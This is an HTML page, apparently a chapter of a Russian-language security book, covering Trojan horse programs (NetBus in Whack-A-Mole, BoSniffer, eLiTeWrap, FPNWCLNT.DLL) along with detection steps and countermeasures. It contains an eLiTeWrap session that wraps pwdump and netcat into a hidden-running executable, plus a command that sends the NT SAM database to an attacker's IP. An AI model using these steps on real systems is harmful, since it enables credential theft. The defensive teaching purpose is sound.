@@ -1,0 +1,122 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
+</head>
+<link rel="stylesheet" href="../STYLE.css">
+<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
+<table BORDER=0   COLS=3 WIDTH="16%" >
+  <tr> 
+    <td><a href="Index3.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
+    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
+    <td ALIGN=RIGHT><a href="Index5.html"><img SRC="For.gif" BORDER=0 ></a></td>
+  </tr>
+</table>
+
+ 
+<br>
+<table width="100%" border="0">
+  <tr>
+    <td class="Text_n">
+ 
+<p class="Tit_CN">
+
+Программы типа &quot;троянский конь&quot;</P>
+
+<p class="Text_n">
+Как уже упоминалось во введении, &quot;троянский конь&quot; — это программа, которая для вида выполняет какие-нибудь полезные действия, однако на самом деле предназначена совсем для других (зачастую злонамеренных) действий или скрытно устанавливает коварные или разрушительные программы. Многие из рассмотренных выше средств создания &quot;потайных ходов&quot; могут быть помещены во внешне безобидные пакеты, так что конечные пользователи даже не смогут догадаться о том, насколько опасные программы установлены на их компьютерах. В качестве другого примера можно привести коварную программу, маскирующуюся под файл netstat. Эта программа, в отличие от настоящей утилиты netstat, намеренно не показывает некоторые прослушиваемые порты, тем самым скрывая наличие &quot;потайного хода&quot;. Ниже вы познакомитесь еще с несколькими примерами программ типа &quot;троянский конь&quot;, таких как FPWNCLNT. DLL и &quot;наборы отмычек&quot;.
+<br>
+
+Whack-A-Mole
+<br>
+
+Популярным средством внедрения программы NetBus является игра под названием Whack-A-Mole. Сама игра представляет собой один исполняемый файл с именем whackamole.exe, который является самораспаковывающимся архивом WinZip. При установке игры Whack-A-Mole устанавливается и сервер NetBus с именем explore.exe, а в поддереве системного реестра HKLM\SOFTWARE\Microsoft\ Windows\CurrentVersion\Run создается соответствующий ключ, ссылающийся на этот исполняемый файл. После этого сервер NetBus будет запускаться при каждой загрузке системы (обратите внимание на имя explore). Все эти действия выполняются довольно незаметно и происходят после появления на экране небольшой привлекательной игры под названием Whack-A-Mole.
+</p>
+
+ <p class="Text_n">
+
+<P align="center">
+<span class="Text_b">BoSniffer</span></P>
+<br>
+<p class="Text_n">
+Что может быть лучше, чем инфицирование какой-нибудь системы с
+помощью программы, предназначенной для поиска &quot;потайных ходов&quot;? Утилита BoSniffer, которая вроде бы призвана выявлять Back Orifice, на самом деле является замаскированной ВО. Так что соблюдайте осторожность при использовании подобных бесплатных средств... К счастью, эту программу можно удалить точно так же, как и обычный сервер ВО (см. разделы выше).
+<br>
+<P align="center">
+<span class="Text_b">eLiTeWrap</span></P>
+<br>
+<p class="Text_n">
+Очень популярной программой типа &quot;троянский конь&quot; является
+eLiTeWrap. Она предназначена для &quot;упаковки&quot; многочисленных файлов в один исполняемый файл и последующей их распаковки либо запуска на удаленном узле. Как видно из следующего примера, в такую &quot;обертку&quot; можно поместить также сценарии, что позволяет взломщикам реализовать неповторимые атаки.&nbsp;
+<br>
+<p class="Code"> С:\nt\ew&gt;<span class="Text_b">elitewrap</span><br>
+eLiTeWrap 1.03 - (С) Tom &quot;eLiTe&quot;<br>
+Mclntyre tomSdundeecake.demon.со.uk<br>
+http://www.dundeecake.demon.co.uk/elitewrap<br>
+Stub size: 7712 bytes Enter name of output file: bad.exe<br>
+Operations: 1 - Pack only<br>
+2 - Pack and execute, visible, asynchronously<br>
+3 - Pack and execute,  hidden, asynchronously<br>
+4 - Pack and execute, visible,  synchronously<br>
+5 - Pack and execute,  hidden,  synchronously<br>
+6 - Execute only,     visible, asynchronously<br>
+7 - Execute only,     hidden, asynchronously<br>
+8 - Execute only,     visible,  synchronously<br>
+9 - Execute only,     hidden,  synchronously <br>
+Enter package file #1: c:\nt\pwdump.exe<br>
+Enter operation: 1 Enter package file#2:c:\nt\nc.exe<br>
+Enter operation: 1<br>
+Enter package file #3: c:\nt\ew\attack.bat<br>
+Enter operation: 7<br>
+Enter command line:<br>
+Enter package file #4:<br>
+All done :)<br>
+</p>
+
+Теперь в распоряжении взломщика появился файл с именем bad.exe. При запуске из него будут извлечены утилиты pwdump.exe, netcat (nc.exe), а затем запустится командный файл attack.bat, в котором содержится простая команда, например pwdump i nc.exe -n 192.168.1.1 3000. В результате база данных SAM системы NT попадет на компьютер взломщика (192 .168 .1.1, на котором утилиту netcat следует настроить на прослушивание порта 3000).
+<br>
+
+Программу eLiTeWrap можно обнаружить, если из исполняемого файла взломщик забыл удалить ее сигнатуру. Следующая команда поиска позволит найти сигнатуру в любом файле .ЕХЕ.
+<br>
+<p class="Code">
+С:\nt\<span class="Text_b">ew&gt;find &quot;eLiTeWrap&quot; bad.exe</span><br>
+---BAD.EXE<br>
+eLiTeWrap VI.03<br>
+</p>
+
+<p class="Prim"> Ключевое слово &quot;eLiTeWrap&quot;  может измениться, поэтому при выявлении программы eLiTeWrap не следует полностью полагаться на этот признак.
+</p>
+<P align="center">
+<span class="Text_b">
+Библиотека FPWNCLNT . DLL для Windows NT</span></P>
+<br>
+<p class="Text_n">
+Одна из тайных задач программ типа &quot;троянский конь&quot; состоит в их маскировке под системный компонент регистрации в системе и захвате имен/паролей пользователей. Одним из примеров реализации такого подхода является библиотека FPNWCLNT.DLL, устанавливаемая на серверы NT, на которых требуется выполнять синхронизацию паролей с системами Novell NetWare. Эта библиотека перехватывает изменения паролей перед тем, как они будут зашифрованы и записаны в базу данных SAM, что позволяет службам NetWare получить пароли в удобочитаемом виде, обеспечивая тем самым единую форму регистрации.
+<br>
+
+В Internet был помещен код, позволяющий регистрировать факты изменения паролей и заносить сведения об этих изменениях (а не сами пароли) в файл C:\TEMP\PWDCHANGE. OUT. (Более подробную информацию и пример кода можно найти по адресу http://www.ntsecurity.net/security/passworddll.htm.) Хотя эта программа позволяет отслеживать только изменение паролей, ее легко модифицировать так, чтобы с ее помощью можно было захватывать и сами пароли в обычном текстовом формате.
+<br>
+<P align="center">
+<span class="Text_b">
+Контрмеры</span></P>
+<br>
+<p class="Text_n">
+Если нет необходимости в синхронизации паролей между системами NT и NetWare, удалите файл FPNWCLNT.DLL из каталога %systemroot*\system32. Следует проверить также поддерево системного реестра HKEY_LOCAL_MACKINE\SYSTEM\CurrentControlSet\ Control\Lsa\Notificaion Packages (REG_MULTI_SZ) и удалить из него строку FPNWCLNT. Если эта динамически подключаемая библиотека все же необходима для работы в смешанной среде, сравните атрибуты используемого файла с атрибутами его проверенной копии (например, содержащейся на установочном компакт-диске) и убедитесь, что это исходная версия компании Microsoft. Если возникли какие-то сомнения, лучше восстановить данный файл с проверенного носителя.
+<br>
+
+
+</p></td>
+  </tr>
+</table>
+<br>
+<table BORDER=0  COLS=3 WIDTH="11%" >
+  <tr> 
+   <td><a href="Index3.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
+    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
+    <td ALIGN=RIGHT><a href="Index5.html"><img SRC="For.gif" BORDER=0 ></a></td>
+   
+  </tr>
+</table>
+</body>
+</html>
